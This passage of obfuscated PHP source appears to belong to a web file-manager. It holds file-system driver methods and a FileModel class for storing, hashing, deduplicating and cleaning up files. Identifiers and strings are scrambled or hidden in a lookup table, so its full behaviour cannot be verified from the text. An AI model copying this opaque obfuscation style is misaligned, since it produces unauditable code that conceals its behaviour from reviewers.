$this->iconvApp($Š¢×Ú£); if (!$this->delFolder($Š¢×Ú£)) { return !1; } } } } closedir($óæØâÄæ); return rmdir($øçûÚ š); } public function rename($­ŞÃ•Åœ, $¾ôğê¹­) { $—îÇùÃ¤ =& $_SERVER[ü¢ÙÊñÛ]; $Áƒœòû = $this->fileNameAuto($this->pathFather($­ŞÃ•Åœ), $¾ôğê¹­); $Áƒœòû = $this->iconvSystem($Áƒœòû); $­ŞÃ•Åœ = $this->iconvSystem($­ŞÃ•Åœ); $˜á¾Èª = $this->pathFather($­ŞÃ•Åœ); $¬ˆêÃšÀ = rtrim($˜á¾Èª, $—îÇùÃ¤[18]) . $—îÇùÃ¤[18] . $Áƒœòû; $¦€øô¾ = @rename($­ŞÃ•Åœ, $¬ˆêÃšÀ); $¬ˆêÃšÀ = $this->iconvApp($¬ˆêÃšÀ); if ($¦€øô¾) { return $this->getPathOuter($¬ˆêÃšÀ); } $this->writeLog(__FUNCTION__ . $—îÇùÃ¤[1440], !0); return !1; } public function size($˜´”ç¶ ) { $˜´”ç¶  = $this->iconvSystem($˜´”ç¶ ); return filesize_64($˜´”ç¶ ); } public function info($¾ŠªÛ²Ä) { $¾ŠªÛ²Ä = $this->iconvSystem($¾ŠªÛ²Ä); if ($this->isFolder($¾ŠªÛ²Ä)) { return $this->folderInfo($¾ŠªÛ²Ä); } else { if ($this->isFile($¾ŠªÛ²Ä)) { return $this->fileInfo($¾ŠªÛ²Ä); } } return !1; } protected function infoChildren($Ô¤íì­, &$ŸÔĞ¬½Î, $øùà™´ = true) { $÷‚Ì ¥˜ =& $_SERVER[ü¢ÙÊñÛ]; check_abort_echo(); $Ô¤íì­ = rtrim($Ô¤íì­, $÷‚Ì ¥˜[18]) . $÷‚Ì ¥˜[18]; if ($øùà™´) { $Ô¤íì­ = $this->iconvSystem($Ô¤íì­); } if (!($¶ÄÄçß = @opendir($Ô¤íì­))) { return; } while (($‘Ï«ôÇ© = readdir($¶ÄÄçß)) !== !1) { if ($‘Ï«ôÇ© == $÷‚Ì ¥˜[20] || $‘Ï«ôÇ© == $÷‚Ì ¥˜[1352]) { continue; } $ğº˜Çù = $Ô¤íì­ . $‘Ï«ôÇ©; if (is_file($ğº˜Çù) || is_link($ğº˜Çù)) { $ŸÔĞ¬½Î[$÷‚Ì ¥˜[91]]++; $ŸÔĞ¬½Î[$÷‚Ì ¥˜[90]] += filesize_64($ğº˜Çù); } else { if (is_dir($ğº˜Çù)) { $ŸÔĞ¬½Î[$÷‚Ì ¥˜[92]]++; $this->infoChildren($ğº˜Çù, $ŸÔĞ¬½Î, !1); } } } closedir($¶ÄÄçß); } private function folderInfo($µ°»÷é¡, $ò­ÊøûÎ = false) { $¦™’½„± =& $_SERVER[ü¢ÙÊñÛ]; $µ°»÷é¡ = rtrim($µ°»÷é¡, $¦™’½„±[18]) . $¦™’½„±[18]; $ÕÉ‡ö® = $this->iconvApp($this->pathThis($µ°»÷é¡)); if ($ò­ÊøûÎ) { return array($¦™’½„±[42] => $ÕÉ‡ö®, $¦™’½„±[98] => $this->getPathOuter($µ°»÷é¡), $¦™’½„±[43] => $¦™’½„±[89]); } $€ßÙ”å = array($¦™’½„±[42] => $ÕÉ‡ö®, $¦™’½„±[98] => $this->getPathOuter($µ°»÷é¡), $¦™’½„±[43] => $¦™’½„±[89], $¦™’½„±[244] => @filectime($µ°»÷é¡), $¦™’½„±[99] => @filemtime($µ°»÷é¡), $¦™’½„±[1444] => @fileatime($µ°»÷é¡), $¦™’½„±[1445] => is_readable($µ°»÷é¡), $¦™’½„±[1446] => is_writable($µ°»÷é¡), $¦™’½„±[1447] => get_mode($µ°»÷é¡)); return $€ßÙ”å; } private function fileInfo($µÌîˆ÷³, $„½‘ğˆ = false) { $Ñ‚úô·â =& $_SERVER[ü¢ÙÊñÛ]; $«ï““É = $this->iconvApp($this->pathThis($µÌîˆ÷³)); if ($„½‘ğˆ) { return array($Ñ‚úô·â[42] => $«ï““É, $Ñ‚úô·â[98] => $this->getPathOuter($µÌîˆ÷³), $Ñ‚úô·â[43] => $Ñ‚úô·â[243], $Ñ‚úô·â[90] => $this->size($µÌîˆ÷³), $Ñ‚úô·â[180] => $this->ext($«ï““É)); } $‰í°ñøœ = array($Ñ‚úô·â[42] => $«ï““É, $Ñ‚úô·â[98] => $this->getPathOuter($µÌîˆ÷³), $Ñ‚úô·â[43] => $Ñ‚úô·â[243], $Ñ‚úô·â[244] => @filectime($µÌîˆ÷³), $Ñ‚úô·â[99] => @filemtime($µÌîˆ÷³), $Ñ‚úô·â[1444] => @fileatime($µÌîˆ÷³), $Ñ‚úô·â[90] => $this->size($µÌîˆ÷³), $Ñ‚úô·â[180] => $this->ext($«ï““É), $Ñ‚úô·â[1445] => is_readable($µÌîˆ÷³), $Ñ‚úô·â[1446] => is_writable($µÌîˆ÷³), $Ñ‚úô·â[1447] => get_mode($µÌîˆ÷³)); return $‰í°ñøœ; } public function exist($¹º¬£š) { $¹º¬£š = $this->iconvSystem($¹º¬£š); return @file_exists($¹º¬£š); } public function isFile($¯îŠĞùí) { $¯îŠĞùí = $this->iconvSystem($¯îŠĞùí); return @is_file($¯îŠĞùí); } public function isFolder($Î³‘„¾€) { $Î³‘„¾€ = $this->iconvSystem($Î³‘„¾€); return @is_dir($Î³‘„¾€); } public function listPath($ó¬ å, $£Ñ–ÏËÇ = false) { $¬®Ü­º‰ =& $_SERVER[ü¢ÙÊñÛ]; $ó¬ å = $this->iconvSystem($ó¬ å); $ó¬ å = rtrim($ó¬ å, $¬®Ü­º‰[18]) . $¬®Ü­º‰[18]; $¥Öœ¶äú = array($¬®Ü­º‰[96] => array(), $¬®Ü­º‰[97] => array()); if (!($­ƒŠ™°İ = @opendir($ó¬ å))) { return $¥Öœ¶äú; } while (($ÁáÕª¬» = readdir($­ƒŠ™°İ)) !== !1) { if ($ÁáÕª¬» == $¬®Ü­º‰[20] || $ÁáÕª¬» == $¬®Ü­º‰[1352]) { continue; } $šû¯íÍ = $ó¬ å . $ÁáÕª¬»; if (is_file($šû¯íÍ)) { $¥Öœ¶äú[$¬®Ü­º‰[97]][] = $this->fileInfo($šû¯íÍ, $£Ñ–ÏËÇ); } else { $¥Öœ¶äú[$¬®Ü­º‰[96]][] = $this->folderInfo($šû¯íÍ, $£Ñ–ÏËÇ); } } closedir($­ƒŠ™°İ); return $¥Öœ¶äú; } public function listAll($“ñ¿êŠ‡, &$§î­Ë¡ğ = array()) { $¢ìÕîÓ =& $_SERVER[ü¢ÙÊñÛ]; $“ñ¿êŠ‡ = $this->iconvSystem($“ñ¿êŠ‡); $“ñ¿êŠ‡ = rtrim($“ñ¿êŠ‡, $¢ìÕîÓ[18]) . $¢ìÕîÓ[18]; if (!($ÉŞ±î‹ = @opendir($“ñ¿êŠ‡))) { return $§î­Ë¡ğ; } while (($Å«ÈÁ¢à = readdir($ÉŞ±î‹)) !== !1) { if ($Å«ÈÁ¢à == $¢ìÕîÓ[20] || $Å«ÈÁ¢à == $¢ìÕîÓ[1352]) { continue; } $çöÂï† = $“ñ¿êŠ‡ . $Å«ÈÁ¢à; $“€éÕ» = is_dir($çöÂï†) && !is_link($çöÂï†) ? 1 : 0; $çöÂï† = $“€éÕ» ? $çöÂï† . $¢ìÕîÓ[18] : $çöÂï†; $§î­Ë¡ğ[] = array($¢ìÕîÓ[98] => $çöÂï†, $¢ìÕîÓ[89] => $“€éÕ», $¢ìÕîÓ[99] => intval(@filemtime($çöÂï†)), $¢ìÕîÓ[90] => $“€éÕ» ? 0 : intval($this->size($çöÂï†))); if ($“€éÕ») { $this->listAll($çöÂï†, $§î­Ë¡ğ); } } closedir($ÉŞ±î‹); return $§î­Ë¡ğ; } public function has($üÅìåÔÔ, $Çğ™Ğ™† = false, $ö‚µÇãÙ = true) { $İÑ‘›¥… =& $_SERVER[ü¢ÙÊñÛ]; $üÅìåÔÔ = $this->iconvSystem($üÅìåÔÔ); $üÅìåÔÔ = rtrim($üÅìåÔÔ, $İÑ‘›¥…[18]) . $İÑ‘›¥…[18]; if (!($ßÂÙ£ºÙ = @opendir($üÅìåÔÔ))) { return !1; } $º¯ĞŒÍ‰ = 0; $ÔøÚ•Ô¢ = 0; $íŞçöºÑ = 0; while (($‹˜Åı‘¶ = readdir($ßÂÙ£ºÙ)) !== !1) { if ($‹˜Åı‘¶ == $İÑ‘›¥…[20] || $‹˜Åı‘¶ == $İÑ‘›¥…[1352]) { continue; } $«ù«İ£× = $üÅìåÔÔ . $‹˜Åı‘¶; if ($Çğ™Ğ™†) { $íŞçöºÑ++; if (@is_file($«ù«İ£×)) { $º¯ĞŒÍ‰++; } else { $ÔøÚ•Ô¢++; } if ($íŞçöºÑ > 10000) { break; } continue; } if ($ö‚µÇãÙ) { if (@is_file($«ù«İ£×)) { return !0; } } else { if (@is_dir($«ù«İ£× . $İÑ‘›¥…[18])) { return !0; } } } closedir($ßÂÙ£ºÙ); if ($Çğ™Ğ™†) { return array($İÑ‘›¥…[252] => $º¯ĞŒÍ‰, $İÑ‘›¥…[253] => $ÔøÚ•Ô¢); } return !1; } public function hashSimple($ÔÕ˜”ª¦) { $åÚø«¥¯ =& $_SERVER[ü¢ÙÊñÛ]; if (!$ÔÕ˜”ª¦) { return md5($åÚø«¥¯[22]); } $ÔÕ˜”ª¦ = $this->iconvSystem($ÔÕ˜”ª¦); $Ñ’‚‚Ş  = $this->size($ÔÕ˜”ª¦); $ŸµŒÎòÆ = 200; $˜ˆ„·Ø¤ = 50; if ($Ñ’‚‚Ş  <= $ŸµŒÎòÆ * $˜ˆ„·Ø¤) { return $this->hashMd5($ÔÕ˜”ª¦) . $Ñ’‚‚Ş ; } $œº­¥’¡ = $åÚø«¥¯[22]; $‹¨³­Çö = intval($Ñ’‚‚Ş  / $˜ˆ„·Ø¤); $÷æÕğæ÷ = fopen($ÔÕ˜”ª¦, $åÚø«¥¯[1448]); if (!$÷æÕğæ÷) { return $œº­¥’¡; } for ($³šŠ£ = 0; $³šŠ£ < $˜ˆ„·Ø¤; $³šŠ£++) { fseek_64($÷æÕğæ÷, $‹¨³­Çö * $³šŠ£); $œº­¥’¡ .= fread($÷æÕğæ÷, $ŸµŒÎòÆ); } fseek_64($÷æÕğæ÷, $Ñ’‚‚Ş  - $ŸµŒÎòÆ); $œº­¥’¡ .= fread($÷æÕğæ÷, $ŸµŒÎòÆ); fclose($÷æÕğæ÷); return md5($œº­¥’¡) . $Ñ’‚‚Ş ; } public function getContent($ï¼ê˜·à) { $ï¼ê˜·à = $this->iconvSystem($ï¼ê˜·à); return file_get_contents($ï¼ê˜·à); } public function setContent($–×Ìˆš, $•ôŞÂÖ = '') { $–×Ìˆš = $this->iconvSystem($–×Ìˆš); $Ë½Ÿ³˜è = @file_put_contents($–×Ìˆš, $•ôŞÂÖ, LOCK_EX); if (!$Ë½Ÿ³˜è) { $this->writeLog(__FUNCTION__ . $_SERVER[ü¢ÙÊñÛ][1440], !0); } clearstatcache(); @chmod($–×Ìˆš, $this->pathAuth); return $Ë½Ÿ³˜è === !1 ? !1 : !0; } public function fileSubstr($€’½ÌÅ, $²ßÈ–œ” = 0, $’°ªßĞ = false) { $íÎîìÄ© =& $_SERVER[ü¢ÙÊñÛ]; $€’½ÌÅ = $this->iconvSystem($€’½ÌÅ); if ($’°ªßĞ === !1) { $’°ªßĞ = $this->size($€’½ÌÅ); } if ($’°ªßĞ <= 0) { return $íÎîìÄ©[22]; } $È£µÇ¿¤ = fopen($€’½ÌÅ, $íÎîìÄ©[1448]); if (!$È£µÇ¿¤) { return !1; } fseek_64($È£µÇ¿¤, $²ßÈ–œ”); $ˆğı¶ = fread($È£µÇ¿¤, $’°ªßĞ); fclose($È£µÇ¿¤); if (!$ˆğı¶) { $this->writeLog(__FUNCTION__ . $íÎîìÄ©[1440], !0); } return $ˆğı¶; } public function upload($ğÖÇï²½, $Õˆğ°š, $òÅşÔé² = false, $ıç¯®–· = REPEAT_REPLACE) { if ($òÅşÔé²) { return $this->moveFile($Õˆğ°š, $ğÖÇï²½); } return $this->copyFile($Õˆğ°š, $ğÖÇï²½); } public function setModifyTime($çÙ’øÃÆ, $™œ¤Ò¾® = '') { @touch($çÙ’øÃÆ, intval($™œ¤Ò¾®)); } public function download($·Ì¢ôô, $÷ŒñşÛ³) { return $this->iconvSystem($·Ì¢ôô); } } goto cËÙÈÕ¶ïõ; Cåƒˆ ÂŸÆ: class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\x69\154\145"; protected $tableMeta = array("\x74\x61\x62\x6c\145\x4e\x61\155\x65" => "\x69\157\137\x66\x69\154\x65\137\x6d\x65\x74\x61", "\155\x65\x74\x61\106\x69\145\x6c\144" => "\x66\x69\154\x65\x49\x44"); public function fileInfo($ê¡´·€È) { $©Ö¤ó¸é =& $_SERVER[ü¢ÙÊñÛ]; static $‚ì™¤£ë = array(); if (!isset($‚ì™¤£ë[$ê¡´·€È])) { $öıî‘ÆÕ = $©Ö¤ó¸é[2009]; $ÆÖ½€£… = Model($©Ö¤ó¸é[555])->field($öıî‘ÆÕ)->where(array($©Ö¤ó¸é[553] => $ê¡´·€È))->find(); $‚ì™¤£ë[$ê¡´·€È] = $ÆÖ½€£…; } return $‚ì™¤£ë[$ê¡´·€È]; } public function addFileByContent($ÜÄ¾’øØ = '', $õ”ßéÁ = '') { $¼¨·è£ı =& $_SERVER[ü¢ÙÊñÛ]; $¾†°İÏ = TEMP_PATH . $¼¨·è£ı[2010]; if (!is_dir($¾†°İÏ)) { mk_dir($¾†°İÏ); } $­µ‡ÊÒ« = $¾†°İÏ . $¼¨·è£ı[2011] . rand_string(16); file_put_contents($­µ‡ÊÒ«, $ÜÄ¾’øØ); $¼º–£‘Ş = $this->addFile($­µ‡ÊÒ«, $õ”ßéÁ, !0); if (file_exists($­µ‡ÊÒ«)) { @unlink($­µ‡ÊÒ«); } return $¼º–£‘Ş; } public function createFileName($­³ğÅ°¹, $Í£ê€©Ä = false, $½¨‰­® = false) { $õ²È­Ã =& $_SERVER[ü¢ÙÊñÛ]; $çâ’óˆš = IO::init($õ²È­Ã[18]); $¶‹®ƒ¨Æ = $this->makeFilePath($­³ğÅ°¹, $çâ’óˆš, $Í£ê€©Ä, $½¨‰­®); $Èë¨ü½ = $çâ’óˆš->pathFather($¶‹®ƒ¨Æ); static $±¾‹÷¨ = false; $‰½ŸÛÜÄ = $õ²È­Ã[2012] . md5($Èë¨ü½); if (!$±¾‹÷¨ && !Cache::get($‰½ŸÛÜÄ)) { $±¾‹÷¨ = !0; $øæç’Š¹ = IO::mkdir($Èë¨ü½); if (!IO::exist($øæç’Š¹ . $õ²È­Ã[863])) { IO::mkfile($øæç’Š¹ . $õ²È­Ã[863]); } Cache::set($‰½ŸÛÜÄ, 1, 3600 * 2); } return $¶‹®ƒ¨Æ; } public function makeFilePath($›Î°ÖÉä, $‰ë½â÷õ, $˜Ó€Ç‹ú = false, $ñäíŠøı = false) { $şáã¼§” =& $_SERVER[ü¢ÙÊñÛ]; $Êª›éÑÄ = Model($şáã¼§”[835])->get($şáã¼§”[2013]); $ÎØê” = KodIO::defaultIO() . date($şáã¼§”[2014]); $‰ İÇßÂ = $ÎØê” . rand_string(5) . short_id(100); $›Î°ÖÉä = str_replace($şáã¼§”[18], $şáã¼§”[21], KodIO::clear($›Î°ÖÉä)); $øİË”™ = $‰ë½â÷õ->ext($›Î°ÖÉä); if (!$›Î°ÖÉä) { $Êª›éÑÄ = $şáã¼§”[841]; } switch ($Êª›éÑÄ) { case $şáã¼§”[2015]: if ($øİË”™) { $‰ İÇßÂ = $‰ İÇßÂ . $şáã¼§”[20] . $øİË”™; } if ($øİË”™ == $şáã¼§”[1951]) { $‰ İÇßÂ .= $şáã¼§”[1280]; } break; case $şáã¼§”[2016]: $µîÊ™† = Model($şáã¼§”[835])->get($şáã¼§”[836]); $Ä“ı³ãŠ = substr(md5($şáã¼§”[837] . $µîÊ™† . date($şáã¼§”[814])), 0, 8); $®Š²‚‘¤ = KodIO::defaultDriver(); $ÎØê” = $şáã¼§”[1311] . $®Š²‚‘¤[$şáã¼§”[486]] . $şáã¼§”[495] . date($şáã¼§”[2017]) . $Ä“ı³ãŠ . $şáã¼§”[18]; if ($øİË”™ == $şáã¼§”[1951]) { $›Î°ÖÉä .= $şáã¼§”[1280]; } $ÒõØ˜ß¥ = $şáã¼§”[2018] . $ÎØê” . $›Î°ÖÉä; CacheLock::lock($ÒõØ˜ß¥); $‰ İÇßÂ = $ÎØê” . $›Î°ÖÉä; if (IO::exist($ÎØê” . $›Î°ÖÉä)) { $â¯™«¿Š = substr($›Î°ÖÉä, 0, strlen($›Î°ÖÉä) - strlen($øİË”™)); $˜İÂÎ = $ñäíŠøı ? substr($ñäíŠøı, 0, 5) : ($˜Ó€Ç‹ú ? substr($˜Ó€Ç‹ú, 0, 5) : rand_string(5)); $‰ İÇßÂ = $ÎØê” . $â¯™«¿Š . $˜İÂÎ; if ($øİË”™) { $‰ İÇßÂ = $‰ İÇßÂ . $şáã¼§”[20] . $øİË”™; } } if (IO::isOsDriver($‰ İÇßÂ) && !IO::isUploadServer($‰ İÇßÂ)) { if (IO::exist($‰ İÇßÂ)) { return $‰ İÇßÂ; } $Ãõ¸íèİ = IO::setContent($‰ İÇßÂ, $şáã¼§”[22]); if (!$Ãõ¸íèİ) { show_json($şáã¼§”[2019], !1); } } CacheLock::unlock($ÒõØ˜ß¥); break; case $şáã¼§”[841]: break; default: break; } return $‰ İÇßÂ; } public function addFileByRemote($¬ô—³—ì, $íĞ³Ö, $Í ë«œ¨ = array()) { $£Ó­ùÁ° =& $_SERVER[ü¢ÙÊñÛ]; if (!IO::exist($¬ô—³—ì)) { return !1; } $àè¶š = $Í ë«œ¨[$£Ó­ùÁ°[558]] ? $Í ë«œ¨[$£Ó­ùÁ°[558]] : $£Ó­ùÁ°[22]; $£µí™˜ = IO::hashMd5($¬ô—³—ì, $àè¶š); $ŒìŸ­Ğ® = KodIO::defaultDriver(); $á¨ø¯¹ = array($£Ó­ùÁ°[631] => IO::size($¬ô—³—ì), $£Ó­ùÁ°[2020] => 1, $£Ó­ùÁ°[505] => $íĞ³Ö, $£Ó­ùÁ°[874] => $ŒìŸ­Ğ®[$£Ó­ùÁ°[486]], $£Ó­ùÁ°[506] => $¬ô—³—ì, $£Ó­ùÁ°[2021] => $Í ë«œ¨[$£Ó­ùÁ°[686]] ? $Í ë«œ¨[$£Ó­ùÁ°[686]] : IO::hashSimple($¬ô—³—ì), $£Ó­ùÁ°[2022] => $£µí™˜ ? $£µí™˜ : $àè¶š); if ($»ä¹¥§® = $this->addFileCheckExist($á¨ø¯¹[$£Ó­ùÁ°[686]], $á¨ø¯¹[$£Ó­ùÁ°[558]], $á¨ø¯¹[$£Ó­ùÁ°[90]])) { return $»ä¹¥§®; } return $this->addFileData($á¨ø¯¹); } private function addFileData($è³“ä‹ñ) { $öºï«™§ =& $_SERVER[ü¢ÙÊñÛ]; if (!$è³“ä‹ñ) { return !1; } $è³“ä‹ñ[$öºï«™§[90]] = intval($è³“ä‹ñ[$öºï«™§[90]]); if (!$è³“ä‹ñ[$öºï«™§[90]] && strlen($è³“ä‹ñ[$öºï«™§[686]]) > 32) { $è³“ä‹ñ[$öºï«™§[90]] = intval(substr($è³“ä‹ñ[$öºï«™§[686]], 32)); } $ìó¨¤É£ = $this->add($è³“ä‹ñ); return $this->find($ìó¨¤É£); } public function addFile($²•“ª¬¤, $°ŠÄÎè¤, $›àõÃØá = false) { $ŠÈ¾—À… =& $_SERVER[ü¢ÙÊñÛ]; $Òæ°…î³ = IO::hashSimple($²•“ª¬¤); $¼íä ñ = IO::size($²•“ª¬¤); $Âè©Ä¨ = $¼íä ñ <= 1024 * 1024 * 10 ? IO::hashMd5($²•“ª¬¤) : $ŠÈ¾—À…[22]; $ÆÁé’ = $ŠÈ¾—À…[2023] . $Òæ°…î³; CacheLock::lock($ÆÁé’); if ($Âè©Ä¨ && $Òæ°…î³) { $ßŞÃçà• = $this->addFileCheckExist($Òæ°…î³, $Âè©Ä¨, $¼íä ñ); if ($ßŞÃçà•) { CacheLock::unlock($ÆÁé’); return $ßŞÃçà•; } } $İ¥ŠêÚ¸ = $this->addFileMake($²•“ª¬¤, $¼íä ñ, $Òæ°…î³, $Âè©Ä¨, $°ŠÄÎè¤, $›àõÃØá); $³¤©ç´ø = $this->addFileData($İ¥ŠêÚ¸); CacheLock::unlock($ÆÁé’); if (!$Âè©Ä¨ && $³¤©ç´ø) { $this->fileMd5Check($³¤©ç´ø); } return $³¤©ç´ø; } public function fileMd5Check($Êòø×Ş¹) { $šÒÁÈÎ´ =& $_SERVER[ü¢ÙÊñÛ]; $”–¶¢ş = array($Êòø×Ş¹[$šÒÁÈÎ´[552]], $Êòø×Ş¹[$šÒÁÈÎ´[98]]); $‘Ô“ò¿º = $šÒÁÈÎ´[2024] . $Êòø×Ş¹[$šÒÁÈÎ´[98]]; $¬·ˆ³€ğ = $šÒÁÈÎ´[2025] . $Êòø×Ş¹[$šÒÁÈÎ´[552]]; TaskQueue::add($šÒÁÈÎ´[2026], $”–¶¢ş, $‘Ô“ò¿º, $¬·ˆ³€ğ); } public function fileMd5Set($µØ‚­Ó, $Á´¾¹Îæ) { $¿¦©äƒÑ =& $_SERVER[ü¢ÙÊñÛ]; $ŠöÃ„Ü‰ = $this->find($µØ‚­Ó); if (!$ŠöÃ„Ü‰ || $ŠöÃ„Ü‰[$¿¦©äƒÑ[558]]) { return; } $ Ã­«ƒ = IO::hashMd5($Á´¾¹Îæ); if (!$ Ã­«ƒ) { return $¿¦©äƒÑ[22]; } $this->where(array($¿¦©äƒÑ[552] => $µØ‚­Ó))->save(array($¿¦©äƒÑ[558] => $ Ã­«ƒ)); } public function addFileMake($àÉ¬ÊÂ, $ß—âÕ¹ï, $ÅöÀ›ÎÕ, $–…¶Ñª, $ÉÈ­µªª, $Õïíî‚) { $óåã™®â =& $_SERVER[ü¢ÙÊñÛ]; $‰²ˆ”« = $this->createFileName($ÉÈ­µªª, $ÅöÀ›ÎÕ, $–…¶Ñª); $Çó»´¢¿ = get_path_father($‰²ˆ”«); $ÍÁ±£Ïş = get_path_this($‰²ˆ”«); if ($Õïíî‚) { $Ù»¥·–¶ = IO::move($àÉ¬ÊÂ, $Çó»´¢¿, !1, $ÍÁ±£Ïş); } else { $Ù»¥·–¶ = IO::copy($àÉ¬ÊÂ, $Çó»´¢¿, !1, $ÍÁ±£Ïş); } if (!$Ù»¥·–¶) { return !1; } $´Î½ıšô = KodIO::defaultDriver(); $Ø‹Î‚£Ò = array($óåã™®â[631] => $ß—âÕ¹ï, $óåã™®â[2020] => 1, $óåã™®â[505] => $ÉÈ­µªª, $óåã™®â[874] => $´Î½ıšô[$óåã™®â[486]], $óåã™®â[506] => $‰²ˆ”«, $óåã™®â[2021] => $ÅöÀ›ÎÕ, $óåã™®â[2022] => $–…¶Ñª); return $Ø‹Î‚£Ò; } public function addFileCheckExist($Òè·§¦, $áÁÁ¦Å¹, $¡µ•‰Âô) { $µõÄò„º =& $_SERVER[ü¢ÙÊñÛ]; $°ú‚ï©– = $this->findByHash($Òè·§¦, $áÁÁ¦Å¹); if (!$°ú‚ï©–) { return !1; } $í·ççßí = array($µõÄò„º[2020] => intval($°ú‚ï©–[$µõÄò„º[2027]]) + 1, $µõÄò„º[631] => $¡µ•‰Âô); $this->where(array($µõÄò„º[553] => $°ú‚ï©–[$µõÄò„º[552]]))->save($í·ççßí); return $°ú‚ï©–; } public function remove($„ÑŠğœ–) { $this->linkCountChange($„ÑŠğœ–, !1); $this->clearEmpty(); return !0; } public function linkAdd($¨ôŸİ»÷) { $this->linkCountChange($¨ôŸİ»÷, !0); } public function linkCountChange($ç„Ñ€Ü, $îâ¾Á€™) { $ÑÁèõì  =& $_SERVER[ü¢ÙÊñÛ]; if (!$ç„Ñ€Ü) { return; } if (!is_array($ç„Ñ€Ü)) { $ç„Ñ€Ü = array($ç„Ñ€Ü); } $‹Åªù÷í = array(); foreach ($ç„Ñ€Ü as $Ñ‘¢¨Àº) { $œ‹Ä­Ô² = $Ñ‘¢¨Àº . $ÑÁèõì [22]; if (!$‹Åªù÷í[$œ‹Ä­Ô²]) { $‹Åªù÷í[$œ‹Ä­Ô²] = 0; } $‹Åªù÷í[$œ‹Ä­Ô²]++; } $Š²æíı§ = array(); foreach ($‹Åªù÷í as $Ñ‘¢¨Àº => $ôìÕ¬ä³) { $œ‹Ä­Ô² = $ôìÕ¬ä³ . $ÑÁèõì [22]; if (!$Š²æíı§[$œ‹Ä­Ô²]) { $Š²æíı§[$œ‹Ä­Ô²] = array(); } $Š²æíı§[$œ‹Ä­Ô²][] = $Ñ‘¢¨Àº; } foreach ($Š²æíı§ as $ôìÕ¬ä³ => $á¢ñÓ‚) { if (!$á¢ñÓ‚) { continue; } $ôìÕ¬ä³ = $îâ¾Á€™ ? $ôìÕ¬ä³ : -intval($ôìÕ¬ä³); $ú­İìßò = array($ÑÁèõì [552] => array($ÑÁèõì [17], $á¢ñÓ‚)); if ($ôìÕ¬ä³ < 0) { $ú­İìßò[$ÑÁèõì [2027]] = array($ÑÁèõì [1081], abs($ôìÕ¬ä³)); } $this->where($ú­İìßò)->setAdd($ÑÁèõì [2027], $ôìÕ¬ä³); } } public function findByHash($øæ²“ç¹, $Ü¤Ëâ¼ô = false) { $¯´·¯«› =& $_SERVER[ü¢ÙÊñÛ]; if (!$øæ²“ç¹ && !$Ü¤Ëâ¼ô) { return !1; } $ÑÃööïß = array($¯´·¯«›[2021] => $øæ²“ç¹); if ($Ü¤Ëâ¼ô) { $ÑÃööïß = array($¯´·¯«›[2022] => $Ü¤Ëâ¼ô); } return $this->order($¯´·¯«›[2028])->where($ÑÃööïß)->find(); } public function clearEmpty($«„€È± = 0) { $ƒ¢†ëğÉ =& $_SERVER[ü¢ÙÊñÛ]; $À¯í = time() - 3600 * 24 * $«„€È±; $¬Ã·•Áš = $ƒ¢†ëğÉ[2029] . $À¯í; $õ‘µ¨€ğ = $this->where($¬Ã·•Áš)->select(); if (!$õ‘µ¨€ğ) { return; } $“şì©òÃ = new Task($ƒ¢†ëğÉ[2030], $ƒ¢†ëğÉ[22], count($õ‘µ¨€ğ)); foreach ($õ‘µ¨€ğ as $ Éøù¡) { $“şì©òÃ->update(1); $this->resetFile($ Éøù¡); } $“şì©òÃ->end(); } public function resetFile($Ïó€ºÉ) { $–Ô»‹Â‹ =& $_SERVER[ü¢ÙÊñÛ]; $ëìâæ¼½ = array($–Ô»‹Â‹[553] => $Ïó€ºÉ[$–Ô»‹Â‹[552]]); $æÙƒÅÅâ = Model($–Ô»‹Â‹[1410])->where($ëìâæ¼½)->count(); $¾ˆ ¬…Ç = Model($–Ô»‹Â‹[2031])->where($ëìâæ¼½)->count(); $Œ™‚õ€¿ = intval($æÙƒÅÅâ) + intval($¾ˆ ¬…Ç); if ($Œ™‚õ€¿ == 0) { IO::remove($Ïó€ºÉ[$–Ô»‹Â‹[98]]); Model($–Ô»‹Â‹[2032])->delete($Ïó€ºÉ[$–Ô»‹Â‹[552]]); $this->where($ëìâæ¼½)->delete(); $this->metaSet($Ïó€ºÉ[$–Ô»‹Â‹[552]], null, null); write_log(ACTION . $–Ô»‹Â‹[2033] . KodUser::id() . $–Ô»‹Â‹[2034] . $Ïó€ºÉ[$–Ô»‹Â‹[552]] . $–Ô»‹Â‹[2035] . $Ïó€ºÉ[$–Ô»‹Â‹[90]] . $–Ô»‹Â‹[212] . $Ïó€ºÉ[$–Ô»‹Â‹[98]], $–Ô»‹Â‹[2036]); return; } if ($Ïó€ºÉ[$–Ô»‹Â‹[2027]] != $Œ™‚õ€¿) { $this->where($ëìâæ¼½)->save(array($–Ô»‹Â‹[2020] => $Œ™‚õ€¿)); } } public function storageInfo($·Øıø‹û = false) { $®„Ú°—  =& $_SERVER[ü¢ÙÊñÛ]; $ª÷î”ŠŒ = $this->count() + 0.0; $£Í¸Ë¬È = 0; $„ÔÙàôñ = 1; $ŒÔİÈØ§ = 0; $ÀÜ¯Ò = 5000; for ($‘£Ôé¸ = 0; $‘£Ôé¸ < $ª÷î”ŠŒ; $‘£Ôé¸ = $‘£Ôé¸ + $ÀÜ¯Ò) { $ÈŠéñÕç = $this->limit($‘£Ôé¸, $‘£Ôé¸ + $ÀÜ¯Ò)->select(); foreach ($ÈŠéñÕç as $ûû¨äœÚ) { $„ÔÙàôñ += $ûû¨äœÚ[$®„Ú°— [90]] * $ûû¨äœÚ[$®„Ú°— [2027]]; $£Í¸Ë¬È += $ûû¨äœÚ[$®„Ú°— [90]] * ($ûû¨äœÚ[$®„Ú°— [2027]] - 1); $ŒÔİÈØ§ += $ûû¨äœÚ[$®„Ú°— [2027]]; } } $öÁÎ¶Ÿ = array($®„Ú°— [2037] => $„ÔÙàôñ, $®„Ú°— [2038] => $£Í¸Ë¬È, $®„Ú°— [2039] => $£Í¸Ë¬È / $„ÔÙàôñ, $®„Ú°— [94] => $ª÷î”ŠŒ, $®„Ú°— [2040] => $ŒÔİÈØ§); return $öÁÎ¶Ÿ; } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\x75\x70"; protected $tableMeta = array("\164\x61\x62\x6c\145\x4e\x61\x6d\x65" => "\147\162\x6f\165\160\x5f\155\145\x74\x61", "\x6d\145\164\141\106\151\145\x6c\144" => "\147\x72\x6f\165\x70\x49\x44"); protected function cacheFunctionAlias($Äˆ¹Û—) { $ëÃñ¾òœ =& $_SERVER[ü¢ÙÊñÛ]; return array($ëÃñ¾òœ[2041] => array($Äˆ¹Û—[0], $ëÃñ¾òœ[2042]), $ëÃñ¾òœ[2043] => array($Äˆ¹Û—[0], 